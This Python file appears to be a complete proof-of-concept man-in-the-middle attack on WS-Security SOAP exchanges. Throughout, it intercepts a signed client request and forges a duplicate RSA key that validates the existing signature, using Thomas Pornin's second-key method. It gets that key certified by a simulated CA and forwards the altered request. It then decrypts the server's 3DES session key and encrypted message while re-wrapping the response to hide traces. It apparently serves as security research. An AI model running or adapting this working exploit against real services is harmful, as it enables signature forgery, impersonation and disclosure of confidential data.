import socket, re, random, base64, math, time, hashlib
from M2Crypto import RSA, X509, EVP, ASN1
from Crypto.PublicKey import RSA as PyRSA
from lxml import etree
from Crypto.Cipher import DES3
import signxml
from signxml import XMLVerifier
from defusedxml.lxml import fromstring

def main(listeningport=8081, serviceport=8080):
    """
    Runs the attack against the server and client.
    :param listeningport: port the client will connect to
    :param serviceport: port the server is running on
    :return:
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", listeningport))
        s.listen()
        print("Waiting for client connection...")
        connection, address = s.accept()

    with connection:
        print("Client ip: ", address)
        print("Waiting for data...")
        request = b''
        while True:
            # data size found by sniffing with wireshark
            data = connection.recv(8186)
            request += data
            if not data:
                break
            timestarted = time.time()

            # Needed for etree
            data = extractXML(data)

            # Retrieve the client's certificate
            raw_client_key = extractCertFromXML(data)
            cert = b'-----BEGIN CERTIFICATE-----\r\n' + raw_client_key + b'\r\n-----END CERTIFICATE-----'
            key = pubkeyFromPem(cert.decode("utf-8"))  # needed for M2Crypto verify
            rsakey = PyRSA.importKey(key.as_der())
            print("Extracted public key from message...")

            # Retrieve signature and the signed data
            signed_data, raw_signature = extractSigData(data)
            print("Extracted signature and SignedInfo from message...")
            #print("0 invalid, 1 valid: ", verifySignature(raw_signature, key, signed_data))  # Sanity check


            # Remove the certificate from the SignedInfo element
            new_signed_data = modifyData(signed_data, b'<ds:Reference URI="#X509Token">(.+?)</ds:Reference>', b'')
            m = hashlib.sha1()
            m.update(new_signed_data)
            vp = m.digest()

            # Create a duplicate key on the given signature and public key, following the algorithm by Thomas Pornin
            newe, newd, newn = createDuplicateKey(rsakey.e, rsakey.n, vp, raw_signature)

            derkey = PyRSA.construct((newn, newe, newd, 17, 19))  # Dummy p, q
            secondarypubkey = RSA.load_key_string(derkey.exportKey('PEM'))

            print("Successfully created secondary key pair!")

            # Create a new CA signed certificate for the duplicate key
            new_cert = makeAndSignCert(secondarypubkey)
            valid = verifySignature(raw_signature, pubkeyFromPem(new_cert.as_pem()), new_signed_data)
            if valid:
                print("Successfully created new certificate!")
            else:
                print("Failed to create new certificate!")
                raise

            new_cert_mod = fixedDerFromPem(new_cert.as_pem())

            # Replace the original with the modified certificate
            print("Modifying request with new certificate...")
            new_cert_mod = b''.join(new_cert_mod.splitlines())
            request = replaceSigCert(request, new_cert_mod)

            # Replace the SignedInfo element with the new one
            request = replaceSignedInfo(request, new_signed_data)

            # Send it to the responder and intercept the response
            response = sendToResponder(request, serviceport)

            # no-deo without confidentiality impact:
            # connection.send(response)
            # return

            # Decrypt symmetrical key
            sym_key = extractSymKey(response)

            sym_key_raw = int.from_bytes(sym_key, byteorder='big')
            sym_key_int = pow(sym_key_raw, newd, newn)

            # Encrypt with client public key
            keylength = (len(bin(newn)) - 2) // 8  # in bytes
            repacked_sym_key_raw = pow(sym_key_int, rsakey.e, rsakey.n)
            repacked_sym_key_bytes = repacked_sym_key_raw.to_bytes(keylength, byteorder='big')
            repacked_sym_key = base64.b64encode(repacked_sym_key_bytes)

            # Remove traces (replace certificate and symmetrical key)
            new_response = replaceSymKey(response, repacked_sym_key)
            new_response = replaceClientCert(new_response, raw_client_key)

            # Sanity check
            new_response_xml = extractXML(new_response)
            response_signed_data, response_raw_signature = extractSigData(new_response_xml)
            print("Sanity check; Signature still valid:", verifySignature(response_raw_signature, key,
                                                                          response_signed_data))

            print("Sending response back to initiator...")
            connection.send(new_response)

            sym_key = sym_key_int.to_bytes(length=keylength, byteorder='big')

            # Plaintext (of sym key) = 02 | PADDING | 00 | KEY, key is 24 byte long
            sym_key = sym_key[-24:]

            cipher_text = extractCipherData(response)

            # Ciphertext = IV (8 bytes) | Ciphertext
            iv = cipher_text[:8]
            cipher_text = cipher_text[8:]

            cipher = DES3.new(sym_key, DES3.MODE_CBC, iv)

            # Decrypt ciphertext
            plain_text = cipher.decrypt(cipher_text)

            # Plaintext = message | padding | paddinglength (1 byte)
            padding_length = plain_text[-1]
            plain_text = plain_text[:(padding_length * (-1))]

            print("Encrypted content:", plain_text)

            # Print time elapsed since client connection
            print("Seconds since started:", time.time() - timestarted)


def sendToResponder(data, port):
    """
    Sends data to a port
    :param data: data to send
    :param port: port to send it to
    :return:
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(("127.0.0.1", port))
        s.send(data)
        print("Data forwarded to responder!")
        while True:
            # Again, wireshark
            response = s.recv(8164)
            return response


def calcByteAmount(x):
    """
    Calculates the amount of bytes needed to store an integer
    :param x: integer to measure amount of bytes of
    :return: amount of bytes in x
    """
    return int(math.log(x, 256)) + 1


######### Extraction/Replacement functions #########


def replaceSignedInfo(data, signedData):
    data = modifyData(data, b'<ds:SignedInfo(.+?)</ds:SignedInfo>', signedData)
    return data

def replaceSigCert(data, cert):
    """
    Replaces the x509 certificate used for signature validation in data
    :param data: data to be changed
    :param cert: certificate that should replace the old one
    :return:
    """
    data = modifyData(data, b'Id=\"X509Token\">(.+?)</wsse:BinarySecurityToken>', b'Id=\"X509Token\">'
                      + cert + b'</wsse:BinarySecurityToken>')
    return data


def replaceClientCert(data, cert):
    """
    Replaces the certificate used to encrypt the symmetrical key in XML data
    :param data: XML data to be changed
    :param cert: certificate that should replace the old one in data
    :return:
    """
    data = modifyData(data, b'profile-1.0#X509v3">(.+)</wsse:KeyI', b'profile-1.0#X509v3">' + cert + b'</wsse:KeyI')
    return data


def extractSymKey(data):
    """
    Extracts symmetric 3DES key from XML data
    :param data: XML string containing the encrypted symmetric key
    :return: base64 decoded, encrypted symmetric key
    """
    filtered = re.search(b'</ds:KeyInfo><xenc:CipherData><xenc:CipherValue>(.+?)</xenc:CipherValue>', data)
    key = ''
    if filtered:
        key = filtered.group(1)
    return base64.b64decode(key)


def replaceSymKey(data, symkey):
    data = modifyData(data, b'</ds:KeyInfo><xenc:CipherData><xenc:CipherValue>(.+?)</xenc:CipherValue>',
                      b'</ds:KeyInfo><xenc:CipherData><xenc:CipherValue>' + symkey + b'</xenc:CipherValue>')
    return data


def extractCipherData(data):
    """
    Extracts the encrypted message from XML data
    :param data: XML data containing an encrypted message
    :return: base64 decoded, encrypted message
    """
    filtered = re.search(b'EncryptionMethod><xenc:CipherData><xenc:CipherValue>(.+?)</xenc:CipherValue>', data)
    cipherdata = ''
    if filtered:
        cipherdata = filtered.group(1)
    return base64.b64decode(cipherdata)


def extractXML(data):
    """
    Extracts full SOAP envelope from an HTTP request (or similar)
    :param data: String containing SOAP envelope
    :return: SOAP envelope string
    """
    filtered = re.search(b'<SOAP-ENV:Envelope([\s\S]+)</SOAP-ENV:Envelope>', data)
    env = b''
    if filtered:
        env = filtered.group(1)
    return b'<SOAP-ENV:Envelope' + env + b'</SOAP-ENV:Envelope>'


def extractCertFromXML(data):
    """
    Extracts the x509 token from bytestring
    :param data: Bytestring containing an x509 token
    :return: Value of the x509 token
    """
    filtered = re.search(b'Id=\"X509Token\">(.+?)</wsse:BinarySecurityToken>', data)
    key = b''
    if filtered:
        key = filtered.group(1)
    return key


def extractSigData(data):
    """
    Taken from signxml's XMLVerifier, and slightly modified to provide what's needed
    :param data: SOAP envelope with signature and signed info
    :return: signedinfo, signature tuple
    """
    require_x509 = True
    x509_cert = None
    hmac_key = None
    validate_schema = True
    parser = None
    id_attribute = None

    ver = XMLVerifier()
    ver.hmac_key = hmac_key
    ver.require_x509 = require_x509
    ver.x509_cert = x509_cert
    ver._parser = parser

    if x509_cert:
        XMLVerifier.require_x509 = True

    if id_attribute is not None:
        ver.id_attributes = (id_attribute,)

    root = ver.get_root(data)
    if root.tag == signxml.ds_tag("Signature"):
        signature_ref = root
    else:
        signature_ref = ver._find(root, "Signature", anywhere=True)

    # HACK: deep copy won't keep root's namespaces
    signature = fromstring(etree.tostring(signature_ref), parser=parser)

    if validate_schema:
        ver.schema().assertValid(signature)

    signed_info = ver._find(signature, "SignedInfo")
    c14n_method = ver._find(signed_info, "CanonicalizationMethod")
    c14n_algorithm = c14n_method.get("Algorithm")
    signature_value = ver._find(signature, "SignatureValue")
    raw_signature = base64.b64decode(signature_value.text)
    signed_info_c14n = ver._c14n(signed_info, algorithm=c14n_algorithm)
    return signed_info_c14n, raw_signature


def pubkeyFromPem(cert):
    """
    Returns public key from given X509 PEM certificate
    :param cert: X509 PEM certificate
    :return: public key contained in cert
    """
    certificate = X509.load_cert_string(cert, X509.FORMAT_PEM)
    publickey = certificate.get_pubkey()
    return publickey


def fixedDerFromPem(data):
    """
    Removes first and last line of PEM certificate
    :param data: PEM certificate
    :return: Second to second-last line of the PEM certificate
    """
    return data[28:-27]


######### Modify data #########


###
# Replaces substrings matching @expression with @newdata
###
def modifyData(data, expression, newdata):
    """
    Replaces substrings matching the given expression in data with newdata
    :param data: data containing substring to be replaced
    :param expression: expression the substring must match
    :param newdata: substring that should replace the old one
    :return: data with the replaced substring
    """
    replaced = re.sub(expression,
                      newdata,
                      data)
    return replaced


######### Signature functions #########


def verifySignature(sig, pubkey, content):
    """
    Verifies a signature against a public key
    :param sig: Signature to be verified
    :param pubkey: Public key that should be verified against the signature
    :param content: Content that was signed
    :return: -1 if SSL error, 0 if invalid, 1 if valid
    """
    pubkey.reset_context(md='sha1')
    pubkey.verify_init()
    pubkey.verify_update(content)

    return (pubkey.verify_final(sig))


######### Duplicate Key Generation Algorithms #########

###
# Extended euclidean algorithm, taken from
# https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm
###
def xgcd(a, b):
    """return (g, x, y) such that a*x + b*y = g = gcd(a, b)"""
    x0, x1, y0, y1 = 0, 1, 1, 0
    while a != 0:
        q, b, a = b // a, a, b % a
        y0, y1 = y1, y0 - q * y1
        x0, x1 = x1, x0 - q * x1
    return b, x0, y0


###
# Taken from https://rosettacode.org/wiki/Chinese_remainder_theorem#Python
###
def mul_inv(a, b):
    """
    Calculates the multiplicative inverse of a in residue class b
    :param a: factor
    :param b: modulus
    :return: e so that e * a = 1 mod b
    """
    b0 = b
    x0, x1 = 0, 1
    if b == 1: return 1
    while a > 1:
        q = a // b
        a, b = b, a % b
        x0, x1 = x1 - q * x0, x0
    if x1 < 0: x1 += b0
    return x1


###
# Taken from https://medium.com/@prudywsh/how-to-generate-big-prime-numbers-miller-rabin-49e6e6af32fb
###
def is_prime(n, k=128):
    """ Test if a number is prime
        Args:
            n -- int -- the number to test
            k -- int -- the number of tests to do
        return True if n is prime
    """
    # Test if n is not even.
    # But care, 2 is prime !
    if n == 2 or n == 3:
        return True
    if n <= 1 or n % 2 == 0:
        return False
    # find r and s
    s = 0
    r = n - 1
    while r & 1 == 0:
        s += 1
        r //= 2
    # do k tests
    for _ in range(k):
        a = random.randrange(2, n - 1)
        x = pow(a, r, n)
        if x != 1 and x != n - 1:
            j = 1
            while j < s and x != n - 1:
                x = pow(x, 2, n)
                if x == 1:
                    return False
                j += 1
            if x != n - 1:
                return False
    return True


def generate_prime_candidate(length):
    """ Generate an odd integer randomly
        Args:
            length -- int -- the length of the number to generate, in bits
        return a integer
    """
    # generate random bits
    p = random.getrandbits(length)
    # apply a mask to set MSB and LSB to 1
    p |= (1 << length - 1) | 1
    return p


def generate_prime_number(length=1024):
    """ Generate a prime
        Args:
            length -- int -- length of the prime to generate, in bits
        return a prime
    """
    p = 4
    # keep generating while the primality test fail
    while not is_prime(p, 128):
        p = generate_prime_candidate(length)
    return p



def porninCRT(x, y, m, n):
    """
    Chinese Remainder Theorem fitted for Thomas Pornin's second key generation algorithm for RSA 1.5
    Sent to me by Thomas Pornin himself
    """
    c = mul_inv(n, m)
    z = (x - y) % m
    z = z * c % m
    z = z * n + y
    return z



def checkConstraints(q, vp, sig):
    """
    Checks if q fulfills the constraints states in Pornin's second key algorithm for RSA
    :param q: Prime
    :param vp: padded message (public decrypt of sig)
    :param sig: Signature q is being generated for
    :return:
    """
    p = 2 * q + 1
    if not is_prime(p):
        return False, 0
    if vp % p == 0:
        return False, 0
    if sig % p == 0:
        return False, 0
    for d in range(1, p, 2):
        power = pow(vp, d, p)
        if power == (sig % p):
            if math.gcd(d, 2 * q) == 1:
                return True, d
    return False, 0


def generate_k_primes(sig, vp, keylength=1024):
    """
    Generates k primes on a signature, message pair such that a second key can be generated
    following the Second Key Generation Algorithm by THomas Pornin
    :param sig: Signature on vp
    :param vp: Padded message
    :param keylength: length of the RSA key used to sign vp
    :return: (di, ei, pi , qi), sum(pi) for all i < k
    """
    prodlist = []
    checked = []
    np = []
    print("Generating secondary key pair...")
    while listprod(prodlist) < sig or len(
            bin(listprod(prodlist))) - 2 > keylength:  # Step 2 of the second-key algorithm
        qi = generate_prime_number(16)
        pi = 2 * qi + 1
        if pi in checked:
            continue
        checked.append(pi)
        fits, di = checkConstraints(qi, vp, sig)  # Checks step 1 of the second-key algorithm
        if fits:
            ei = mul_inv(di, (pi - 1))  # Step 3 of the second-key algorithm
            np.append((di, ei, pi, qi))
            prodlist.append(pi)
        bitlen = len(bin(listprod(prodlist))) - 2
        if bitlen > keylength:  # If too big, pop biggest prime
            print(bitlen - keylength, "bits too much - replacing biggest prime...")
            ind = prodlist.index(max(prodlist))
            prodlist.pop(ind)
            np.pop(ind)
    return np, listprod(prodlist)


###
# Returns the product of all elements in @inputlist
###
def listprod(inputlist):
    """
    Returns the product of all elements in a list
    :param inputlist: List the product should be calculated of
    :return: product of elements in list
    """
    prod = 1
    for item in inputlist:
        prod = prod * item
    return prod


def createDuplicateKey(e, n, vp, sig):
    """
    Creates a secondary key for public exponent e and modulus n on a signature
    :param e: public exponent
    :param n: modulus
    :param vp: SHA1 of new signed data
    :param sig: signature
    :return: new key: (e, n) public, (d, n) private
    """
    sig = int.from_bytes(sig, byteorder='big')

    vprime = pow(sig, e, n)  # vprime = sig^e mod n
    vprime = int.to_bytes(vprime, 256, byteorder='big')
    vprime = bytearray(vprime[:-1 * (len(vp))])  # Cut off the original hash
    vprime.extend(vp)  # Append the (possibly modified) hash
    vprime = int.from_bytes(vprime, byteorder='big')  # Convert back to int

    primeresults, nprime = generate_k_primes(sig, vprime,
                                             len(bin(n)) - 2)  # Handles steps 1-3 of the second-key algorithm
    dprime = None
    eprime = None
    acc = None
    for (di, ei, _, qi) in primeresults:
        if dprime is None:
            dprime = di
            eprime = ei
            acc = qi
            continue

        dprime = porninCRT(dprime, di, acc, qi)
        eprime = porninCRT(eprime, ei, acc, qi)

        acc = acc * qi

    if dprime % 2 == 0:
        dprime += acc
    if eprime % 2 == 0:
        eprime += acc

    # verification
    print("Verifying...")
    for _, _, pi, _ in primeresults:
        pmo = pi - 1
        rd = dprime % pmo
        re = eprime % pmo
        if (re * rd) % pmo != 1:
            print("Private key does not match public key!")
            raise
    if pow(sig, eprime, nprime) != vprime:
        print("Signature mismatch!")
        raise
    return eprime, dprime, nprime


######### Certificate creation ##########

def makeAndSignCert(key):
    """
    Simulates a successful certificate sign request to the CA
    :param key: RSA key the certificate should be based on
    :return: Certificate signed by CA
    """
    req = makeRequest(key)
    cert = makeCert(req)
    return cert


def makeCert(req):
    """
    Signs a CSR
    :param req: CSR to be signed
    :return: Certificate signed by CA
    """
    pkey = req.get_pubkey()

    cacert = X509.load_cert("cacert.pem")

    rsa = RSA.load_key('decca-key.pem')
    caprivkey = EVP.PKey()
    caprivkey.assign_rsa(rsa)

    sub = req.get_subject()

    cert = X509.X509()

    cert.set_serial_number(1)
    cert.set_version(2)
    cert.set_subject(sub)
    casub = cacert.get_subject()

    cert.set_issuer(casub)
    cert.set_pubkey(pkey)
    mk_cert_valid(cert)
    cert.add_ext(
        X509.new_extension('subjectAltName', 'DNS:foobar.example.com'))
    ext = X509.new_extension('nsComment', 'M2Crypto generated certificate')
    ext.set_critical(0)  # Defaults to non-critical, but we can also set it
    cert.add_ext(ext)
    cert.sign(caprivkey, 'sha1')

    assert (cert.get_ext('subjectAltName').get_name() == 'subjectAltName')
    assert (cert.get_ext_at(0).get_name() == 'subjectAltName')
    assert (cert.get_ext_at(0).get_value() == 'DNS:foobar.example.com')

    return cert


###
# Creates a new CSR from the RSA key @pk
# Taken from https://github.com/eventbrite/m2crypto/blob/master/demo/x509/ca.py
###
def makeRequest(pk):
    """
    Creates a new CSR from an RSA key
    :param pk: RSA key
    :return: CSR
    """
    pkey = EVP.PKey()
    pkey.assign_rsa(pk)
    req = X509.Request()
    req.set_version(2)
    req.set_pubkey(pkey)
    name = X509.X509_Name()
    name.CN = 'cirosec gmbh'
    req.set_subject_name(name)
    ext1 = X509.new_extension('subjectAltName', 'DNS:foobar.example.com')
    ext2 = X509.new_extension('nsComment', 'Hello there')
    extstack = X509.X509_Extension_Stack()
    extstack.push(ext1)
    extstack.push(ext2)

    assert (extstack[1].get_name() == 'nsComment')

    req.add_extensions(extstack)
    req.sign(pkey, 'sha1')
    return req


def mk_cert_valid(cert, days=365):
    """
    Make a cert valid from now and til 'days' from now.
    Args:
        cert -- cert to make valid
        days -- number of days cert is valid for from now.
    """
    t = int(time.time())
    now = ASN1.ASN1_UTCTIME()
    now.set_time(t)
    expire = ASN1.ASN1_UTCTIME()
    expire.set_time(t + days * 24 * 60 * 60)
    cert.set_not_before(now)
    cert.set_not_after(expire)


inp = input("Port to use (8081): ")
if inp == '':
    inp = 8081  # If no port is specified, start on port 8081
else:
    inp = int(inp)
main(inp, 8080)
